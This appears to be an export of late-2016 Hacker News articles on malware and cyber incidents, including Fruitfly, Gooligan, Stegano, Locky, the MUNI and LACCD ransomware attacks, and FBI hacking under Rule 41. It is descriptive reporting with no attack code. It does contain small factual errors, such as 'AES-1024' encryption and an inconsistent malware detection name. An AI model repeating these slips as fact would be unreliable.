Dubbed Fruitfly, the malware has remained undetected for years on macOS systems despite using unsophisticated and \"antiquated code.\" Infosec firm Malwarebytes discovered Fruitfly, detected as 'OSX.Backdoor.Quimitchin,' after one of its IT administrators spotted some unusual outgoing activity from a particular Mac computer. According to the researchers, the recently discovered what they're calling \"the first Mac malware of 2017\" contains code that dates before OS X, which has reportedly been conducting detailed surveillance operation on targeted networks, possibly for over two years. Fruitfly uses a hidden pearl script to communicate back to two command-and-control (C&C) servers and has the ability to perform actions like capturing webcam and screenshots from both Mac and Linux systems, grabbing the system's uptime, and moving and clicking a mouse cursor. Fruitfly can also collect information about other devices connected to the same network as the infected Mac, and then tries to connect to them, according to a blog post published by Malwarebytes. The malware also uses a secondary script and Java class to hide its icon from showing in the macOS Dock, though it's still unclear how the malware got distributed and infected the machines. What's more interesting is that the malware uses code that pre-dates Apple's OS X operating system, including SGGetChannelDeviceList, SGSetChannelDevice, SGSetChannelDeviceInput, and SGStartRecord. Researchers said the malware is even running open-source \"libjpeg\" code to open or create JPEG-formatted image files, which was last updated in 1998. On further digging into the code, the researchers discovered the malware had even gone through changes to \"support\" Mac OS X Yosemite indicating Fruitfly is at least two years old. However, the old code and upgrade to support Mac Yosemite do not indicate the exact creation date of the malware. \"The only reason I can think of that this malware has not been spotted before now is that it's being used in very tightly targeted attacks, limiting its exposure,\" Thomas Reed of Malwarebytes wrote in the post. \"There have been [many] stories over the past few years about Chinese and Russian hackers targeting and stealing the United States and European scientific research. Although there is no evidence at this point linking this malware to a specific group, the fact that it has been seen specifically at biomedical research institutions certainly seems like it could be the result of exactly that kind of espionage.\" The Fruitfly's code even includes Linux shell commands that show signs of the malware potentially running just fine on Linux operating system. So, it would come as no surprise if a Linux variant of Fruitfly was in operation. Reed also said he has also come across related Windows executables that connected to the same C&C server used by the Fruitfly malware but date back to at least 2013. However, the good news is that Apple has released an update for macOS to address Fruitfly. Although Apple automatically pushes the update, Mac users should consider checking their systems for infections, which is actually known as OSX.Backdoor.Quimitchip." }

The cyber-attack occurred over winter break and caused widespread disruption to online, financial aid, email and voicemail systems, including locking out 1,800 students and staffs from their computers. As the situation was gone out of its hand, the Los Angeles Community College District (LACCD) agreed to pay the ransom demand of $28,000 in Bitcoin to criminals to resume their operations after gaining the decryption keys, the school newspaper, The Valley Star, reports. The cyber criminals gave the college a week to pay the ransom and threatened to delete all the data if they were not paid. Also Read: RansomFree Tool Detects Never-Seen-Before Ransomware Before It Encrypts Your Data Just like most ransomware victims the college obviously was not properly backing up the data. Therefore, the district agreed to pay up the ransom amount to quickly recover access to their systems and data. However, according to the college officials, it was ultimately cheaper for them to pay the ransom than to remove the unknown ransomware virus from their systems to recover data and resume other services. After paying the ransom, the college was given a ransomware decryption key to retaining access to its valuable data. \"LACCD and LAVC information technology staff, outside cybersecurity experts and law enforcement are working together to determine the specific nature and impact of this incident. Our top priority is the integrity of student, faculty and employee data, and we will continue to communicate with the LAVC community and the public as the investigation proceeds.\" the College wrote in a report [PDF]. The college was lucky this time, because, in the case of ransomware, there is no guarantee that one will get the right decryption key in return. For example, recently discovered KillDisk Ransomware that targets Linux machines, demands $218,000 to decrypt, but in return, wipes out data permanently. One of the most notorious examples of ransomware attacks took place in March last year when crooks locked down the computers and sealed all sensitive files of a Los Angeles hospital, including patient data, which eventually made the hospital to pay $17,000. Last year, we saw an enormous rise in Ransomware threats, both in numbers and sophistication, and the only way to secure your environment is to deploy automated and isolated backup mechanism." }

Once victim installs one of these malicious apps, the Switcher malware attempts to log in to the WiFi router the victim's Android device is connected to by carrying out a brute-force attack on the router's admin web interface with a set of a predefined dictionary (list) of usernames and passwords. \"With the help of JavaScript [Switcher] tries to login using different combinations of logins and passwords,\" mobile security expert Nikita Buchka of Kaspersky Lab says in a blog post published today. \"Judging by the hard coded names of input fields and the structures of the HTML documents that the trojan tries to access, the JavaScript code used will work only on web interfaces of TP-LINK Wi-Fi routers.\" Switcher Malware Infects Routers via DNS Hijacking Once accessed web administration interface, the Switcher trojan replaces the router's primary and secondary DNS servers with IP addresses pointing to malicious DNS servers controlled by the attackers. Researchers said Switcher had used three different IP addresses – 101.200.147.153, 112.33.13.11 and 120.76.249.59 – as the primary DNS record, one is the default one while the other two are set for specific internet service providers. Due to change in router's DNS settings, all the traffic gets redirected to malicious websites hosted on attackers own servers, instead of the legitimate site the victim is trying to access. \"The Trojan targets the entire network, exposing all its users, whether individuals or businesses, to a wide range of attacks – from phishing to secondary infection,\" the post reads. \"A successful attack can be hard to detect and even harder to shift: the new settings can survive a router reboot, and even if the rogue DNS is disabled, the secondary DNS server is on hand to carry on.\" Researchers were able to access the attacker’s command and control servers and found that the Switcher malware Trojan has compromised almost 1,300 routers, mainly in China and hijacked traffic within those networks. The Bottom Line Android users are required to download applications only from official Google's Play Store. While downloading apps from third parties do not always end up with malware or viruses, it certainly ups the risk. So, it is the best way to avoid any malware compromising your device and the networks it accesses. You can also go to Settings → Security and make sure \"Unknown sources\" option is turned off. Moreover, Android users should also change their router's default login and passwords so that nasty malware like Switcher or Mirai, can not compromise their routers using a brute-force attack." }

That's Malware", "Address" : "https://thehackernews.com/2016/12/super-mario-run-android-apk.html", "Date" : "2016-12-27T04:44:00-11:00", "Article" : "After the success of Pokémon Go, Nintendo's \"Super Mario Run\" has become the hottest game to hit the market with enormous popularity and massive social impact. The game has taken the world by storm since its launch for iOS devices over a week ago. Can you believe — it was downloaded more than 40 million times worldwide in its first four days of release. But if you have downloaded a Super Mario Run APK for your Android device, Beware! That's definitely a malware. Since Super Mario Run has currently been released only for iOS devices and is not on Google Play, it caused a lot of disappointment among Android users. So, eventually, many Android device owners who love Mario games and can not wait to play Super Mario Run ended up downloading APKs outside of the Google Play Store. But those tons of phony copycat unofficial Super Mario apps on many third-party Android app stores turn out to be malware or viruses that attempt to look like the legitimate Super Mario Run app. Super Mario can Take Full Control of your Android Device To download the third party APK, users are required to \"side-load\" the malicious app by modifying their Android core security settings, allowing their device's operating system to install apps from \"untrusted sources.\" Some of these malicious apps can even take full control of your Android device, as the apps request privileges to edit, read, receive and send text messages, take photos and record videos and track your location using GPS. However, one of the apps titled \"Super Mario\" creates additional icons, displays pop-up and banner ads, installs other malicious apps onto victim's smartphone, and performs other intrusive activities without any users interaction, according to Tokyo-based Trend Micro antivirus firm, which detected malicious Super Mario apps 90,000 times this year. \"Clicking on these ads or icons will direct users to either adult sites or malicious sites. In either case, the goal is to get users to install various apps,\" researchers at Trend Micro writes. \"While some of these apps are perfectly legitimate, some are suspicious apps distributed by third-party app stores, including more malicious apps that even request for administrator rights.\" Another app, also titled \"Super Mario\" and discovered by the security firm, prompts users first to install an app called 9Apps, which then asks for more permissions, including recording audio, reading modifying the calendar and even access to complete SD-card. Here's How to Prevent Yourself So, instead of downloading applications from unknown third party stores, Android users are required to wait for the official Google Play release. Downloading apps from third parties do not always end up with malware or viruses, but it certainly ups the risk. So, it's the best way to wait to avoid compromising your device and the networks it accesses. You can also go to Settings → Security and make sure \"Unknown sources\" option is turned off." }

According to Ukrainian energy provider Ukrenergo, a cyber attack on Kyiv's power grid may have caused the power outages in the country on Saturday, December 17, near midnight. The blackout affected the northern part of Kiev, the country's capital, and surrounding areas, Ukrenergo Director Vsevolod Kovalchuk explained in a post on Facebook. Shortly after the incident, Ukrenergo engineers switched to manual mode and started restoring power in approximately 30 minutes in an effort to deal with the cyber attack. Power was fully restored after just an hour and fifteen minutes of the blackout. According to Kovalchuk, the one responsible for the weekend outage could be an \"external interference through data network,\" however, the company's cybersecurity experts are investigating the incident and will provide more information soon. Although the reason for the outage is not yet confirmed, authorities believe that the unexpected power outage could be the latest in the series of cyber attacks that managed to strike the Ukrainian electric grid and financial infrastructure in December 2015. The 2015 energy blackouts were caused with the help of a malware attack, known as BlackEnergy, which was distributed through boobytrapped Word documents and tricked recipients into enabling macros to activate the malicious payload. Last year, the Ukraine's state security service SBU blamed Russia for causing outages by planting malware on the networks of several regional energy companies. Also, the United States Cyber firm iSight Partners identified the perpetrator as a Russian group of hackers known as \"Sandworm.\" While security experts have found no hard evidence that links these attacks on Ukrainian energy grid to Russia, they believe that the attackers appear to be a nation state with significant resources. SCADA system has always been an attractive target for cybercrooks, given the success of Stuxnet malware that was developed by the US and Israeli together to sabotage the Iranian nuclear facilities a few years ago, and \"Havex\" that previously targeted organizations in the energy sector." }
{ "_id" : { "$oid" : "5b35beae6cefc42b0029350c" }, "Category" : "Malware", "Title" : "Beware of New Celebrity Sex Tape (Scam) Leaked on Facebook!", "Address" : "https://thehackernews.com/2016/12/facebook-scam-malware.html", "Date" : "2016-12-12T00:09:00-11:00", "Article" : "If you came across a celebrity sex video on Facebook featuring Jessica Alba or any other celebrity, just avoid clicking it. Another Facebook scam is circulating across the social networking website that attempts to trick Facebook users into clicking on a link for a celebrity sex tape that instead downloads malware onto their computers. Once installed, the malware would force web browsers to display aggressive advertising web pages which include sites with nudity and fake lotteries. The spam campaign was uncovered by researchers at Cyren, who noted that a malicious Google Chrome extension is spreading nude celebrity PDFs through private messages and posts on various Facebook groups. If opened, the PDF file takes victims to a web page with an image containing a play button, tricking users that the PDF may contain a video. Once clicked, the link redirects users of Internet Explorer, Firefox, or Safari to a web page with overly-aggressive popups and advertisements related to nudity and fake lottery. But on the other hand, this celebrity sex tape scam makes the matter worse for Google Chrome users. The Scam is Fatal for Google Chrome Users Once clicked on the scam link, Chrome desktop users are redirected to a fake YouTube page that leads up a pop-up window inviting victims to install a Google Chrome extension to view the videos. Once victims get to install the malicious extension, the browser directs users to the Facebook.com login page and prompt them to re-authenticate, allowing attackers to collect Facebook users' credentials and then use their accounts to spread the malicious campaign further. When analyzed the Chrome extension's source code, the Cyren team discovered that the extension comes with support for monitoring and intercepting web traffic in real-time, to determine what users can access through their browsers. The malicious Chrome extension contains a long list of Antivirus and AntiSpam domains that it blocks and prevents the user from opening. Besides this, the malicious Chrome extension also prevents victims from accessing the Chrome Extensions settings page, so that victims can not disable the malicious add-on. \"It also blocks the chrome extensions and chrome devtools tabs from being opened, preventing the user from uninstalling the malicious Chrome extension,\" the researchers say. The PDF uploaded to Facebook is generated by selecting the name of a celebrity randomly from the script file and combining the selected name with random characters. The name of celebrities includes Selena Gomez, Jessica Alba, Jennifer Lawrence, Hilary Duff, Paris Hilton, Rihanna, Kim Kardashian, Scarlett Johansson, Kelly Brook, Doutzen Kroes, Elodie Varlet and Nicki Minaj. According to Cyren researchers, the cyber criminals behind this malicious spam campaign managed to upload their extension to the Chrome Web Store, though the extension has since been removed by the Google's security team. How to remove the Malicious Chrome Extension? To remove this malicious extension, the infected users would first have to delete the Registry key from the Registry Editor. To do this, Go to Start Button → Type \"regedit\" in the Search/Run option, which will open the Windows Registry Editor. Now, use the side menu in the new window to find the folder below, right-click it and select \"Remove.\" This is the path to the Registry Editor: HKEY_LOCAL_MACHINE\\Software\\Google\\Chrome\\Extension Now the second step is to remove the extension from the browser. Since the malicious Chrome extension prevents victims from accessing the native Chrome Extensions settings page, one must remove the extension by deleting the following folder from one's PC. C:\\Users\\USER\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions This action will remove all Chrome extensions from your computer. You have no option other than deleting the folder completely to get rid of the malicious threat, as you can not access the Chrome Extensions settings page to get the ID of the malicious extension. Last but not the least, no celebrity recently have had their sex tape leaked (at least not one that's available online). So if you come across any link claiming to show a leaked sex tape of Jessica Alba, Jennifer Lawrence or any other, remember just to report it." }
{ "_id" : { "$oid" : "5b35beba6cefc42b0029350d" }, "Category" : "Malware", "Title" : "This Ransomware Unlocks Your Files For Free If You Infect Others", "Address" : "https://thehackernews.com/2016/12/ransomware-malware.html", "Date" : "2016-12-09T02:20:00-11:00", "Article" : "Is your PC infected with Ransomware? Either pay the ransom amount to the attacker or spread the infection further to get the decryption keys. Yes, this new technique has been employed by cyber criminals with the latest round of ransomware threat, dubbed Popcorn Time. Initially discovered by MalwareHunterTeam, the new Popcorn Time Ransomware has been designed to give the victim's a criminal way of getting a free decryption key for their encrypted files and folders. Popcorn Time works similar to other popular ransomware threats, such as the Crysis Ransomware and TeslaCrypt, that encrypt various data stored on the infected computer and ask victims to pay a ransom amount to recover their data. But to get their important files back, Popcorn Time gives victims option to pay a ransom to the cyber criminal or infect two other people and have them pay the ransom to get a free decryption key. What's even worse? The victims are encouraged to pay the ransom of 1 Bitcoin (~$750) within seven days to receive decryption keys stored on a remote server owned by Popcorn Time's developers. If the ransom is not paid within this duration, the decryption key will be permanently deleted and retrieve important files will become impossible. Moreover, the code of the ransomware is incomplete that may indicate that if victims enter the wrong decryption key four times, the Popcorn Time ransomware will start deleting victims' files. Here's How the Popcorn Time Ransomware Threat Works: Once infected, the Popcorn Time Ransomware will check to see if the ransomware has been run already on the PC. If yes, the ransomware will terminate itself. If not, the Popcorn Time Ransomware will either download various images to use as backgrounds or start encrypting the files using AES-256 encryption. The encrypted files will have the \".filock\" or \".kok\" extension appended to it. While encrypting the data, the ransomware will display a fake screen that pretends to be the installation of the program. As soon as the encryption is finished, it will convert two base64 strings, save them as ransom notes known as restore_your_files.html and restore_your_files.txt, and then automatically display the HTML ransom note asking for 1 Bitcoin. Want a Free Decryption Key? Infect Two More People The Popcorn Time author provides a \"nasty way\" for a victim to get the free decryption key: Spread the Ransomware to two other people via the victim's \"referral\" link.\" If those two infected victims pay the ransom, then the first victim will supposedly get a free decryption key. To make this possible, the ransom note contains a URL pointing to a file located on the Popcorn Time's TOR server. Entering Wrong Decryption Key 4 Times and You are Screwed Up! When executed, the Popcorn Time ransomware will display a lock screen filled in with various information relating to victim's particular installation. The victim will also find a field where he/she can enter the decryption key given to them by the attacker after paying the ransom. The source code for Popcorn Time contains a function that suggests the threat to delete files if the victim enters the wrong decryption code four times. Since the Popcorn Time ransomware is still under development at the time of writing, many things are unclear and may change with time." }

Researchers from antivirus provider ESET released a report on Tuesday stating that they have discovered an exploit kit, dubbed Stegano, hiding malicious code in the pixels of banner advertisements that are currently in rotation on several high profile news websites. Stegano originally dates back to 2014, but since early October this year, cyber crooks had managed to get the malicious ads displayed on a variety of unnamed reputable news websites, each with Millions of daily visitors. Stegano derived from the word Steganography, which is a technique of hiding messages and content inside a digital graphic image, making the content impossible to spot with the naked eye. In this particular malvertising campaign, operators hide malicious code inside transparent PNG image's Alpha Channel, which defines the transparency of each pixel, by altering the transparency value of several pixels. The malvertising campaign operators then packed the altered image as an advertisement and managed to display those malicious ads on several high-profile websites. According to the researchers, the malicious ads promote applications called \"Browser Defense\" and \"Broxu,\" and the methodology makes it tough for ad networks to detect. Here's How the Stegano Attack Works: Once a user visits a site hosting malicious advertisement, the malicious script embedded in the ad reports information about the victim's computer to the attacker's remote server without any user interaction. The malicious code then uses the CVE-2016-0162 vulnerability in Microsoft's Internet Explorer (IE) browser in order to scan the target computer to see if it is running on a malware analyst's machine. After verifying the targeted browser, the malicious script redirects the browser to a website that hosts Flash Player exploits for three now-patched Adobe Flash vulnerabilities: CVE-2015-8651, CVE-2016-1019, and CVE-2016-4117. \"Upon successful exploitation, the executed shell code collects information on installed security products and performs – as paranoid as the cybercriminals behind this attack – yet another check to verify that it is not being monitored,\" ESET researchers wrote in a blog post. \"If results are favorable, it will attempt to download the encrypted payload from the same server again, disguised as a gif image.\" When downloaded to the victim's computer, the encrypted payload is then decrypted and launched via regsvr32.exe or rundll32.exe in Microsoft Windows. Just Visit a Site, and You'll be Hacked in Just 2-3 Sec Below is an ESET infographic that explains the working of Stegano's exploit attack: All the above operations execute automatically without any user interactions and takes place in the span of just 2-3 seconds. So far, the Stegano exploit kit has pushed various trojan downloaders, the Ursnif and Ramnit banking trojans, backdoors, spyware, and file stealers. The Stegano exploit kit was initially used in 2014 to target people in the Netherlands, and then in 2015, moved on to residents in the Czech Republic. The latest attack campaign is targeting people in Canada, the UK, Australia, Spain, and Italy. The best way to protect yourself against any malvertising campaign is always to make sure you are running updated software and apps. Also use reputed antivirus software that can detect such threats before they infect your system." }

The changes introduced to the Rule 41 of the Federal Rules of Criminal Procedure by the United States Department of Justice came into effect on Thursday, after an effort to block the changes failed on Wednesday. The change grants the FBI much greater powers to hack into multiple computers within the country, and perhaps anywhere in the world, with just a single warrant authorized by any US judge (even magistrate judges). Usually, magistrate judges only issue warrants for cases within their jurisdiction. That's the same the FBI did in its 2015 investigation into child pornography site Playpen, in which the agency hacked into some 8,700 computers across 120 different countries. The Supreme Court approved the changes to Rule 41 in April, allowing any U.S. judge to issue search warrants that give the FBI and law enforcement agencies authority to remotely hack computers in any jurisdiction, or even outside the United States. Democratic Senator Ron Wyden attempted three times to block changes to Rule 41 that potentially risks people using Tor, a VPN, or some other anonymizing software to hide their whereabouts, but the efforts were blocked by Republican Senator John Cornyn of Texas. The rule change should take effect on 1st December, today, barring surprises. On the one hand, privacy advocates and legal experts have described the rule change as the extensive expansion of extraterritorial surveillance power that will allow agencies like the FBI to carry out international hacking operations with a lot less of a hassle. On the other hand, the DOJ argued that the changes to the rule will help investigate modern internet criminals, allowing investigators access computers whose locations are \"concealed through technological means,\" like the Tor anonymity network or VPNs (Virtual Private Networks), and devices used in botnets that have become powerful cyber weapons. Assistant Attorney General Leslie Caldwell highlighted these concerns in a blog post published last week, saying if a criminal suspect is using Tor or VPN to hide its real location, it becomes tough for investigators to know his/her current location. \"So in those cases, the Rules do not clearly identify which court the investigators should bring their warrant application to,\" Caldwell said. But what would happen if the FBI hacks the botnet victims, rather than the perpetrators? Or what if the government abuses this power to target nation states? In a speech, Wyden said that the changes to Rule 41 amounted to \"one of the biggest mistakes in surveillance policy in years,\" giving federal investigators \"unprecedented authority to hack into Americans' personal phones, computers, and other devices,\" Reuters reports. Other critics worry that the changes to Rule 41 would give the FBI unfettered ability to hack innocent users whose electronic devices have been infected with botnet malware without their knowledge, or anyone who keeps their identities private online. To this concern, Caldwell argued that investigators accessing the devices of botnet victims \"would, typically, be done only to investigate the extent of the botnet,\" or in order to \"obtain information necessary to liberate victims’ computers from the botnet.\" Caldwell further argued that the rule change would not allow the FBI to conduct \"Mass Hacking;\" in fact, failing to implement the rule change \"would make it more difficult for law enforcement to combat mass hacking by actual criminals.\"" }

A new Android malware that has already breached more than 1 Million Google accounts is infecting around 13,000 devices every day. Dubbed Gooligan, the malware roots vulnerable Android devices to steal email addresses and authentication tokens stored on them. With this information in hands, the attackers are able to hijack your Google account and access your sensitive information from Google apps including Gmail, Google Photos, Google Docs, Google Play, Google Drive, and G Suite. Researchers found traces of Gooligan code in dozens of legitimate-looking Android apps on 3rd-party app stores, which if downloaded and installed by an Android user, malware starts sending your device’s information and stolen data to its Command and Control (C&C) server. \"Gooligan then downloads a rootkit from the C&C server that takes advantage of multiple Android 4 and 5 exploits including the well-known VROOT (CVE-2013-6282) and Towelroot (CVE-2014-3153),\" researchers said in a blog post. \"If rooting is successful, the attacker has full control of the device and can execute privileged commands remotely.\" According to CheckPoint security researchers, who uncovered the malware, anyone running an older version of the Android operating system, including Android 4.x (Jelly Bean, KitKat) and 5.x, (Lollipop) is most at risk, which represents nearly 74% of Android devices in use today. \"These exploits still plague many devices today because security patches that fix them may not be available for some versions of Android, or the patches were never installed by the user,\" researchers added. Once hack into any Android device, Gooligan also generates revenues for the cyber criminals by fraudulently buying and installing apps from Google Play Store and rating them and writing reviews on behalf of the phone's owner. The malware also installs adware to generate revenue. How to check if your Google account has been compromised with this malware? Check Point has published an online tool to check if your Android device has been infected with the Gooligan malware. Just open ‘Gooligan Checker’ and enter your Google email address to find out if you've been hacked. If you found yourself infected, Adrian Ludwig, Google's director of Android security, has recommended you to run a clean installation of the operating system on your Android device. This process is called 'Flashing,' which is quite a complicated process. So, the company recommends you to power off your device and approach a certified technician or your mobile service provider in order to re-flash your device." }

The same proved by hackers on Friday, when more than 2,000 computer systems at San Francisco's public transit agency were apparently got hacked. San Francisco's Municipal Transportation Agency, also known as MUNI, offered free rides on November 26th after MUNI station payment systems and schedule monitors got hacked by ransomware and station screens across the city started displaying a message that reads: \"You Hacked, ALL Data Encrypted. Contact For Key(cryptom27@yandex.com)ID:681 ,Enter.\" According to the San Francisco Examiner, MUNI confirmed a Ransomware attack against the station fare systems, which caused them to shut down ticket kiosks and make rides free this weekend. As you can see, the above message delivered by the malware followed by an email address and ID number, which can then be used to arrange ransom payments. MUNI Spokesman Paul Rose said his agency was investigating the matter and \"working to resolve the situation,\" but did not provide details as of how MUNI got hacked. \"We are currently working to resolve the situation,\" said Rose. \"There is an ongoing investigation, and it wouldn’t be appropriate to provide additional details.\" Pay $73,000 to Free Systems from Ransomware Trains themselves were not affected by the malware attack, and the MUNI claimed that the payments were resumed on the morning of November 27th. The MUNI looks after trains, trams and buses around the city, including San Francisco's iconic cable cars. It is yet not clear exactly who was responsible for the attack (besides a pseudonym \"Andy Saolis\"), but according to local media reports, the agency's computers were being held by ransomware until the MUNI paid the equivalent of more than $73,000 in Bitcoin. Andy Saolis is a pseudonym commonly used in HDDCryptor ransom attacks, which uses commercial tools to encrypt hard drives and network shares on Windows machines using randomly generated keys and then overwrite the hard disks' MBRs to prevent systems from booting up properly. The target machine is typically infected by accidentally opening a malicious executable in an email or download, and then the malware spreads out across the network. The email address, cryptom27@yandex.com, used by anonymous criminal points the city to a Russian email address to arrange payment and has been linked to other cyber attacks as well. The Hacker Linked to a Previous Ransomware Starin When reaching at the provided email, the hacker provided a statement in broken English, which read: \"We don't attention to interview and propagate news! Our software working completely automatically and we don't have targeted attack to anywhere! SFMTA network was Very Open and 2000 Server/PC infected by software! So we are waiting for contact any responsible person in SFMTA but I think they don't want deal ! so we close this email tomorrow!\" The same email address, cryptom27@yandex.com, was linked to a ransomware strain called Mamba in September. The ransomware employs tactics similar to those demonstrated against the MUNI systems. The hacker provided hoodline a list of systems the hacker claimed to have infected in Muni's network, which came out to be 2,112 of the total 8,656 computer networks. The hacker also said that the MUNI had \"one more day\" to make a deal. Not much about the hack is known; the extent of the hack and hacker's identity remain a mystery for now, but the incident once again reminds us that how vulnerable our critical infrastructure remains." }

Even JPG image file could eventually infect your computer with the infamous Locky Ransomware. Earlier this week, we reported a new attack campaign that used Facebook Messenger to spread Locky Ransomware via .SVG image files, although Facebook denied this was the case. Now, researchers have discovered that the ongoing spam campaign is also using boobytrapped .JPG image files in order to download and infect users with the Locky Ransomware via Facebook, LinkedIn, and other social networking platforms. Security researchers from Israeli security firm Check Point have reportedly discovered how cyber criminals are hiding malware in image files, and how they are executing the malware code within these images to infect social media users with Locky variants. According to researchers, malware authors have discovered security vulnerabilities in the Facebook and LinkedIn that forcibly download a maliciously coded image file on a user's computer, though in some cases, the user has to click on the image file to download. When the user detect the automatic download and access that malformed image file, malicious code installs the Locky ransomware onto the user's computer, which encrypts all files on the infected computer until a ransom is paid. Flaws in Facebook and LinkedIn Remain Unpatched The security firm has declined to provide technical details as the vulnerability the malware relies on still impacts both Facebook and LinkedIn, among other unnamed web services. \"The attackers have built a new capability to embed malicious code into an image file and successfully upload it to the social media website,\" Check Point researchers say. \"The attackers exploit a misconfiguration on the social media infrastructure to deliberately force their victims to download the image file. This results in infection of the users' device as soon as the end-user clicks on the downloaded file.\" CheckPoint says the firm reported the issue to both Facebook and LinkedIn back in September, but the vulnerabilities remain unpatched in both the platform, which is now actively being exploited by attackers. Video Demonstration of the Attack You can also watch the video demonstration of this attack, which CheckPoint dubbed ImageGate, which shows the attack in action. Locky is Spreading Massively via Social Media Platform Locky ransomware has been around since early this year and has become the biggest and most common ransomware family known today. It works by encrypting victims' files with RSA-2048 and AES-1024 algorithms and demands a ransom for the key. Locky ransomware mainly spreads via phishing emails containing a malicious attachment disguised as a Word or Zip file. But since people spend time on social network sites, cyber crooks have turned their focus to finding a way into these platforms. Check Point says that in the past week, they have noticed a \"massive spread of the Locky ransomware via social media, particularly in its Facebook-based campaign.\" To keep yourself safe, you are advised not to open any unsolicited file that has automatically downloaded onto your computer, especially image files with unusual extensions like SVG, JS, or HTA.

This FBI's mass hacking campaign is related to the high-profile child pornography Playpen case and represents the largest law enforcement hacking campaign known to date. The warrant was initially issued in February 2015 when the FBI seized the Playpen site and set up a sting operation on the dark web site, in which the agency deployed malware to obtain IP addresses from alleged site's visitors. The piece of malware used by the FBI is known as a Network Investigative Technique (NIT). The malware was used for at least 13 days to break into the computer of users who visited certain threads on Playpen and then sent their IP addresses back to the bureau. Earlier this year, court documents related to the Playpen case revealed that the FBI hacked over 1,000 alleged visitors of Playpen in the U.S. using a single warrant, along with computers in Australia, Chile, Colombia, Austria, Denmark, Greece, the UK, Turkey, and Norway during the investigation. However, the new federal court hearing transcript from a related case reveals that the hack went much further farther and wider than previously believed and that the bureau actually hacked into more than 8,000 users' computers across 120 different countries. \"We have never, in our nation's history as far as I can tell, seen a warrant so utterly sweeping,\" federal public defender Colin Fieman said in a court hearing at the end of October, according to the transcript. According to the transcript, the FBI also hacked what has been described as a \"satellite provider.\" \"So now we are into outer space as well,\" Fieman said. \"The fact that a single magistrate judge could authorise the FBI to hack 8,000 people in 120 countries is truly terrifying,\" Christopher Soghoian, a principal technologist at the American Civil Liberties Union (ACLU), told Motherboard. The major controversy surrounding the Playpen case has been that Virginia-based US Magistrate Judge Theresa C. Buchanan who signed the warrant did not have the authority to authorize such searches. The fact is that the magistrate judges are a more junior type of judges who don't actually have jurisdiction to issue warrants outside their own districts. Only more senior federal judges, known as district judges, have the authority to issue such warrants under Rule 41. However, this would likely change with the changes introduced to the Rule 41 of the Federal Rules of Criminal Procedure by the US Department of Justice. Changes to Rule 41 will Further Expand FBI's Mass Hacking Capabilities The changes to Rule 41 will grant the FBI much greater powers to hack into any computer within the country, and perhaps anywhere in the world, with just a single search warrant authorized by any US judge (even magistrate judges). The changes in this rule are set to take effect on December 1, 2016. \"The US government wants to use an obscure procedure—amending a federal rule known as Rule 41— to radically expand their authority to hack,\" the Electronic Frontier Foundation (EFF) said. \"The changes to Rule 41 would make it easier for them to break into our computers, take data, and engage in remote surveillance.\" However, the DoJ further defended the changes to Rule 41 in a Monday blog post. \"We believe technology shouldn't create a lawless zone merely because a procedural rule has not kept up with the times,\" writes Assistant Attorney General Leslie R. Caldwell of the Criminal Division. If take into effect, privacy activists and cybersecurity experts believe that the US law enforcement will most likely use the changes to Rule 41 to further expand their capabilities of mass hacking techniques." }

Earlier this year, a gang of cyber criminals infected several ATMs with malware in Taiwan and Thailand that caused the machines to spit out millions in cash, and the gang members then stood in front of the infected ATMs at the appointed hour and collected the money. Now, the FBI has warned U.S. banks of the potential for similar ATM jackpotting attacks, saying that the agency is \"monitoring emerging reports indicating that well-resourced and organized malicious cyber actors have intentions to target the U.S. financial sector.\" ATM jackpotting is a technique used to force automated teller machines to spit out cash. According to Russian cyber security firm Group-IB, cyber crooks have remotely infected ATMs with malware in more than dozen countries across Europe this year, which forces machines to spit out cash. The world's two largest ATM manufacturers, Diebold Nixdorf and NCR Corp., said they were aware of the ATM attacks and had already been working with their customers to mitigate the threat. The cyber criminals have been targeting ATMs for at least five years, but the latest hacking campaigns mostly involved small numbers of ATMs due to the fact that hackers required physical access to the machines to collect cash. Group-IB did not name the banks targeted in the campaign but said the victims were located in Armenia, Bulgaria, Estonia, Georgia, Belarus, Kyrgyzstan, Moldova, Spain, Poland, the Netherlands, Romania, the United Kingdom, Russia, and Malaysia. Both Diebold Nixdorf and NCR said they had already provided banks with information on how to thwart the attack, Reuters reported. \"We have been working actively with customers, including those who have been impacted, as well as developing proactive security solutions and strategies to help prevent and minimize the impact of these attacks,\" said Owen Wild, NCR's global marketing director for enterprise fraud and security. The disclosure of the new campaign comes months after two large ATM hacks, wherein hackers stole $2.5 Million from Taiwan's First Bank and $350,000 from Thailand's state-owned Government Savings Bank. While Group-IB believes the attacks across Europe were conducted by a single criminal group, dubbed Cobalt, the FBI believes the malicious software used in the attack could be linked to the Russian ATM gang known as Buhtrap, the Wall Street Journal reported. However, citing the tools and techniques used by both groups, Group-IB believes that Cobalt is linked to Buhtrap, which stole 1.8 Billion rubles ($28 Million) from Russian banks between August 2015 and January 2016." }

An ongoing Facebook spam campaign is spreading malware downloader among Facebook users by taking advantage of innocent-looking SVG image file to infect computers. If clicked, the file would eventually infect your PC with the nasty Locky Ransomware, a family of malware that has quickly become one of the favorite tools among criminals due to its infecting capabilities. Discovered by malware researcher Bart Blaze, the attack campaign uses Facebook Messenger to spread a malware downloader called Nemucod that takes the form of .SVG image files. Why SVG file? Hackers considered SVG (or Scalable Vector Graphics) files for spreading the malware downloader, because SVG has the ability to contain embedded content such as JavaScript, and can be opened in a modern web browser. Crooks added their malicious JavaScript code right inside the image file itself, which was actually a link to an external file. If clicked, the malicious image file would redirect you to a website mimicking YouTube, but with completely different URL. Like a typical way to deliver malware infection, the site would push a popup, asking you to download and install a certain codec extension in Google Chrome in order to view the video. The malicious extension used two names, Ubo and One. Once installed, the extension gives the attackers ability to alter your data regarding websites they visit, as well as takes advantage of browser's access to your Facebook account in order to secretly message all your Facebook friends with the same SVG image file. What's even worse? Peter Kruse, another malware researcher and colleague of Blaze, noted that the SVG image file containing the Nemucod downloader, in some cases, then ultimately downloads a copy of Locky ransomware on victim's PC. Locky ransomware is one of the most popular ransomware that locks all files on a victim's computer with RSA-2048 and AES-1024 encryption algorithms and unlocks them until the ransom is paid to attackers. It is not clear at this moment how the SVG files managed to bypass Facebook's file whitelist extension filter, but both Google and Facebook's security team has already been notified of the attack. How to Remove the Malicious Extensions? While Google has already removed the malicious extensions from its Chrome Store, Facebook will hopefully soon block it entirely. Update: A spokesperson from Facebook provided a statement to The Hacker News, which reads: \"We maintain a number of automated systems to help stop harmful links and files from appearing on Facebook, and we are already blocking these ones from our platform. In our investigation, we determined that these were not in fact installing Locky malware—rather, they were associated with Chrome extensions. We have reported the bad browser extensions to the appropriate parties.\" He also said that the 